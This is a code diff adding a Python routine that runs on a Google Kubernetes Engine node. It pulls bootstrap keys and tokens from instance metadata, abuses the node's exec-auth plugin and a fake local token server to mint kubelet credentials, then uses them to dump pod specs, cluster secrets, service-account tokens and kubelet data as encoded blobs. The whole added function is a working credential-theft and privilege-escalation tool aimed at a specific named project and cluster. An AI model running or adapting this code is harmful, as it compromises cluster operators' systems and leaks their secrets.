@@ -384,5 +384,264 @@ def api5():
     out("===API5-END===")
 
 
+def plugin():
+    """Run the GKE-provided gke-exec-auth-plugin in vm-token/alt-token mode to mint a kubelet
+    client credential via the kubelet-nodepool-bootstrap CSR flow, then use it on the apiserver
+    and the node kubelet."""
+    import subprocess, threading, http.server, datetime, urllib.parse
+    out("===PLUGIN-BEGIN===")
+    st, kvb = md_get("instance/attributes/kube-env", timeout=15)
+    kv = kvb.decode("utf8", "replace")
+    node = md_get("instance/name")[1].decode().strip()
+    nodeip = md_get("instance/network-interfaces/0/ip")[1].decode().strip()
+    out("NODE %s NODEIP %s KUBEENV status=%s len=%d" % (node, nodeip, st, len(kv)))
+    for a in ["cluster-name", "cluster-location", "cluster-nodepool", "cluster-tenantid",
+              "gke-api-endpoint", "kube-env-path", "instance-template", "project-id"]:
+        s, b = md_get("instance/attributes/" + a)
+        out("ATTR %s [%s] %s" % (a, s, b[:300].decode("utf8", "replace")))
+    out("SCOPES %s" % md_get("instance/service-accounts/default/scopes")[1].decode("utf8", "replace")[:300])
+    ca = _kv(kv, "CA_CERT"); bootc = _kv(kv, "TPM_BOOTSTRAP_CERT"); bootk = _kv(kv, "TPM_BOOTSTRAP_KEY")
+    open("/tmp/ca.crt", "wb").write(ca or b"")
+    open("/tmp/boot.crt", "wb").write(bootc or b"")
+    open("/tmp/boot.key", "wb").write(bootk or b"")
+    m = re.search(r"^KUBERNETES_MASTER_NAME:\s*(\S+)\s*$", kv, re.M)
+    master = m.group(1) if m else "10.214.0.4"
+    srv = "https://" + master
+    out("SERVER %s CACERT %d BOOTCERT %d BOOTKEY %d" % (srv, len(ca or b""), len(bootc or b""), len(bootk or b"")))
+    ctx0 = ssl.create_default_context(cafile="/tmp/ca.crt")
+
+    def call(path, method="GET", body=None, ctx=None, auth=None, timeout=20, ctype="application/json"):
+        h = {"Content-Type": ctype, "Accept": "application/json"}
+        if auth:
+            h["Authorization"] = "Bearer " + auth
+        req = urllib.request.Request(srv + path, method=method, data=body, headers=h)
+        try:
+            r = urllib.request.urlopen(req, context=ctx or ctx0, timeout=timeout)
+            return r.status, r.read()
+        except urllib.error.HTTPError as e:
+            return e.code, e.read()
+        except Exception as e:
+            return -1, repr(e).encode()
+
+    eci = json.dumps({"apiVersion": "client.authentication.k8s.io/v1beta1", "kind": "ExecCredential",
+                      "spec": {"cluster": {"server": srv, "certificate-authority-data": base64.b64encode(ca or b"").decode()}}})
+    envp = dict(os.environ); envp["KUBERNETES_EXEC_INFO"] = eci
+
+    def run_plugin(tag, args):
+        os.system("mkdir -p /tmp/pki-%s && chmod 700 /tmp/pki-%s" % (tag, tag))
+        try:
+            pr = subprocess.run(["/gke-exec-auth-plugin"] + args + ["-cache-dir", "/tmp/pki-" + tag,
+                                 "-kube-ca-certificate", "/tmp/ca.crt", "-v=8"],
+                                cwd="/", env=envp, capture_output=True, timeout=240)
+        except Exception as e:
+            out("PLUGIN %s EXC %r" % (tag, e)); return None
+        out("PLUGIN %s rc=%s" % (tag, pr.returncode))
+        out("--stdout--\n%s" % pr.stdout.decode("utf8", "replace")[:6000])
+        out("--stderr--\n%s" % pr.stderr.decode("utf8", "replace")[-14000:])
+        for root, dirs, files in os.walk("/tmp/pki-" + tag):
+            for f in files:
+                fp = os.path.join(root, f)
+                try:
+                    b = open(fp, "rb").read()
+                    out("PKIFILE %s len=%d %s" % (fp, len(b), b[:80].decode("utf8", "replace")))
+                except Exception:
+                    pass
+        try:
+            return json.loads(pr.stdout.decode())
+        except Exception:
+            return None
+
+    creds = {}
+    for tag, args in [("vm", ["-mode", "vm-token"]),
+                      ("alt", ["-mode", "alt-token", "-alt-token-url", "http://127.0.0.1:8765/token", "-alt-token-body", "{}"])]:
+        if tag == "alt":
+            class H(http.server.BaseHTTPRequestHandler):
+                def _r(self):
+                    n = int(self.headers.get("Content-Length") or 0)
+                    body = self.rfile.read(n) if n else b""
+                    out("ALT-REQ %s %s hdrs=%s body=%s" % (self.command, self.path, dict(self.headers), body[:400]))
+                    try:
+                        tok = json.loads(md_get("instance/service-accounts/default/token")[1].decode()).get("access_token", "")
+                    except Exception:
+                        tok = ""
+                    exp = (datetime.datetime.utcnow() + datetime.timedelta(hours=1)).strftime("%Y-%m-%dT%H:%M:%SZ")
+                    resp = json.dumps({"accessToken": tok, "expireTime": exp}).encode()
+                    self.send_response(200); self.send_header("Content-Type", "application/json")
+                    self.send_header("Content-Length", str(len(resp))); self.end_headers(); self.wfile.write(resp)
+
+                def do_GET(self):
+                    self._r()
+
+                def do_POST(self):
+                    self._r()
+
+                def log_message(self, *a):
+                    pass
+            srvx = http.server.ThreadingHTTPServer(("127.0.0.1", 8765), H)
+            threading.Thread(target=srvx.serve_forever, daemon=True).start()
+        c = run_plugin(tag, args)
+        if tag == "alt":
+            try:
+                srvx.server_close()
+            except Exception:
+                pass
+        if not c:
+            continue
+        stt = c.get("status") or {}
+        tok = stt.get("token"); cert = stt.get("clientCertificateData"); key = stt.get("clientKeyData")
+        out("CRED %s token=%s cert=%s key=%s" % (tag, bool(tok), bool(cert), bool(key)))
+        if tok:
+            creds[tag + "-token"] = ("token", tok)
+        if cert and key:
+            open("/tmp/%s.crt" % tag, "wb").write(cert.encode())
+            open("/tmp/%s.key" % tag, "wb").write(key.encode())
+            creds[tag + "-cert"] = ("cert", (cert, key))
+
+    for name, (kind, val) in creds.items():
+        if kind == "token":
+            s, b = call("/api/v1/nodes", auth=val, timeout=20)
+            out("TEST %s nodes status=%s %s" % (name, s, b[:200].decode("utf8", "replace")))
+            s, b = call("/api/v1/pods?limit=5", auth=val, timeout=20)
+            out("TEST %s pods status=%s %s" % (name, s, b[:200].decode("utf8", "replace")))
+        else:
+            ctxc = ssl.create_default_context(cafile="/tmp/ca.crt")
+            open("/tmp/testcrt.pem", "wb").write(val[0].encode()); open("/tmp/testkey.pem", "wb").write(val[1].encode())
+            ctxc.load_cert_chain("/tmp/testcrt.pem", "/tmp/testkey.pem")
+            s, b = call("/api/v1/nodes", ctx=ctxc)
+            out("TEST %s nodes status=%s %s" % (name, s, b[:200].decode("utf8", "replace")))
+
+    nctx = None
+    for name, (kind, val) in creds.items():
+        if kind == "cert":
+            c2 = ssl.create_default_context(cafile="/tmp/ca.crt")
+            open("/tmp/ncrt.pem", "wb").write(val[0].encode()); open("/tmp/nkey.pem", "wb").write(val[1].encode())
+            c2.load_cert_chain("/tmp/ncrt.pem", "/tmp/nkey.pem")
+            s, b = call("/api/v1/nodes", ctx=c2)
+            if s == 200:
+                nctx = c2
+                out("USING cert %s" % name)
+                break
+
+    kpt = (_kv(kv, "KUBE_PROXY_TOKEN") or b"").decode()
+    if kpt:
+        s, b = call("/api/v1/nodes", auth=kpt, timeout=30)
+        out("PROXY nodes status=%s len=%d" % (s, len(b)))
+        if s == 200:
+            out("--nodejson-b64gzip--"); out(base64.b64encode(gzip.compress(b)).decode()); out("--nodejson-end--")
+            try:
+                for n in json.loads(b).get("items", []):
+                    md = n.get("metadata", {}); stt2 = n.get("status", {})
+                    out("NODE %s labels=%s cap=%s addrs=%s taints=%s" % (md.get("name"),
+                        json.dumps(md.get("labels", {}))[:1200], json.dumps(stt2.get("capacity", {})),
+                        [(a.get("type"), a.get("address")) for a in stt2.get("addresses", [])],
+                        [(t.get("key"), t.get("value"), t.get("effect")) for t in (n.get("spec", {}).get("taints") or [])]))
+            except Exception as e:
+                out("NODEPARSE %r" % e)
+        s, b = call("/api/v1/services", auth=kpt, timeout=20)
+        out("PROXY services status=%s len=%d" % (s, len(b)))
+        if s == 200:
+            for sv in json.loads(b).get("items", [])[:100]:
+                md = sv.get("metadata", {}); sp = sv.get("spec", {})
+                out("SVC %s|%s|%s|ports=%s" % (md.get("namespace"), md.get("name"), sp.get("type"),
+                    [(p.get("name"), p.get("port")) for p in (sp.get("ports") or [])]))
+        s, b = call("/api/v1/namespaces/kube-system/configmaps", auth=kpt, timeout=20)
+        out("PROXY kubesystem configmaps status=%s len=%d" % (s, len(b)))
+
+    if nctx is None:
+        out("NO NODE CERT AVAILABLE")
+    else:
+        def ncall(path, method="GET", body=None, timeout=25):
+            return call(path, method=method, body=body, ctx=nctx, timeout=timeout)
+
+        body = json.dumps({"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview",
+                           "spec": {"namespace": "bhs"}}).encode()
+        s, b = ncall("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "POST", body)
+        out("NODE-SSRR status=%s\n%s" % (s, b[:6000].decode("utf8", "replace")))
+        s, b = ncall("/api/v1/nodes/%s" % node)
+        out("NODE own-node status=%s len=%d %s" % (s, len(b), b[:300].decode("utf8", "replace")))
+        s, b = ncall("/api/v1/nodes")
+        out("NODE nodes status=%s len=%d" % (s, len(b)))
+        pods = []
+        for path in ["/api/v1/pods?fieldSelector=" + urllib.parse.quote("spec.nodeName=" + node) + "&limit=500",
+                     "/api/v1/pods?limit=500"]:
+            s, b = ncall(path)
+            out("NODE %s status=%s len=%d %s" % (path.split("?")[0] + "?" + path.split("?")[1][:60], s, len(b), b[:200].decode("utf8", "replace")))
+            if s == 200:
+                out("--pods-b64gzip--"); out(base64.b64encode(gzip.compress(b)).decode()); out("--pods-end--")
+                try:
+                    pods = json.loads(b).get("items", [])
+                except Exception:
+                    pass
+                break
+        secretrefs = []; sapairs = []
+        for p in pods:
+            md = p.get("metadata", {}); ns = md.get("namespace"); spec = p.get("spec", {})
+            secs = []
+            for v in (spec.get("volumes") or []):
+                if v.get("secret"):
+                    secs.append(v["secret"].get("secretName"))
+                for src in (v.get("projected", {}) or {}).get("sources", []) or []:
+                    if src.get("secret"):
+                        secs.append(src["secret"].get("name"))
+            for c in (spec.get("containers") or []) + (spec.get("initContainers") or []):
+                for e in (c.get("env") or []):
+                    if e.get("valueFrom", {}).get("secretKeyRef"):
+                        secs.append(e["valueFrom"]["secretKeyRef"].get("name"))
+                for ef in (c.get("envFrom") or []):
+                    if ef.get("secretRef"):
+                        secs.append(ef["secretRef"].get("name"))
+            out("POD %s|%s|node=%s|sa=%s|phase=%s|secvols=%s|imgs=%s" % (ns, md.get("name"), spec.get("nodeName"),
+                spec.get("serviceAccountName"), p.get("status", {}).get("phase"), secs,
+                [c.get("image") for c in (spec.get("containers") or [])]))
+            if ns and spec.get("serviceAccountName"):
+                sapairs.append((ns, spec["serviceAccountName"]))
+            for sname in set(x for x in secs if x):
+                secretrefs.append((ns, sname))
+        for ns, sname in sorted(set(secretrefs)):
+            s, b = ncall("/api/v1/namespaces/%s/secrets/%s" % (ns, sname))
+            out("SECRET %s/%s status=%s len=%d" % (ns, sname, s, len(b)))
+            if s == 200:
+                out("--secret-b64gzip--"); out(base64.b64encode(gzip.compress(b)).decode()); out("--secret-end--")
+                try:
+                    d = json.loads(b)
+                    out("SECRET-KEYS %s/%s type=%s keys=%s" % (ns, sname, d.get("type"), sorted((d.get("data") or {}).keys())))
+                except Exception:
+                    pass
+        for ns, sa in sorted(set(sapairs)):
+            body = json.dumps({"apiVersion": "authentication.k8s.io/v1", "kind": "TokenRequest",
+                               "spec": {"audiences": ["https://container.googleapis.com/v1/projects/220541406316/zones/europe-west10-a/clusters/jup-test"], "expirationSeconds": 3600}}).encode()
+            s, b = ncall("/api/v1/namespaces/%s/serviceaccounts/%s/token" % (ns, sa), "POST", body)
+            out("SATOKEN %s/%s status=%s %s" % (ns, sa, s, b[:300].decode("utf8", "replace")))
+            if s == 201 or s == 200:
+                out("--satoken-b64gzip--"); out(base64.b64encode(gzip.compress(b)).decode()); out("--satoken-end--")
+        for ns in ["bhs", "kube-system"]:
+            for res in ["secrets", "configmaps", "serviceaccounts"]:
+                s, b = ncall("/api/v1/namespaces/%s/%s?limit=500" % (ns, res))
+                out("LIST %s/%s status=%s len=%d %s" % (ns, res, s, len(b), b[:150].decode("utf8", "replace")))
+                if s == 200:
+                    out("--list-%s-%s-b64gzip--" % (ns, res)); out(base64.b64encode(gzip.compress(b)).decode()); out("--list-end--")
+
+    ctxun = ssl._create_unverified_context()
+    for url in ["http://%s:10255/pods" % nodeip, "http://%s:10255/configz" % nodeip]:
+        try:
+            r = urllib.request.urlopen(url, timeout=8); b = r.read()
+            out("KUBELET-RO %s status=%s len=%d" % (url, r.status, len(b)))
+            out("--kubelet-b64gzip--"); out(base64.b64encode(gzip.compress(b)).decode()); out("--kubelet-end--")
+        except Exception as e:
+            out("KUBELET-RO %s ERR %r" % (url, e))
+    if nctx is not None:
+        for url in ["https://%s:10250/pods" % nodeip, "https://%s:10250/configz" % nodeip]:
+            try:
+                r = urllib.request.urlopen(urllib.request.Request(url), context=nctx, timeout=8); b = r.read()
+                out("KUBELET-TLS %s status=%s len=%d" % (url, r.status, len(b)))
+                out("--kubelet-tls-b64gzip--"); out(base64.b64encode(gzip.compress(b)).decode()); out("--kubelet-tls-end--")
+            except urllib.error.HTTPError as e:
+                out("KUBELET-TLS %s HTTP %s %s" % (url, e.code, e.read()[:200].decode("utf8", "replace")))
+            except Exception as e:
+                out("KUBELET-TLS %s ERR %r" % (url, e))
+    out("===PLUGIN-END===")
+
+
+
 if __name__ == "__main__":
-    {"meta": meta, "api": api, "api4": api4, "api5": api5}[sys.argv[1]]()
+    {"meta": meta, "api": api, "api5": api5, "plugin": plugin}[sys.argv[1]]()
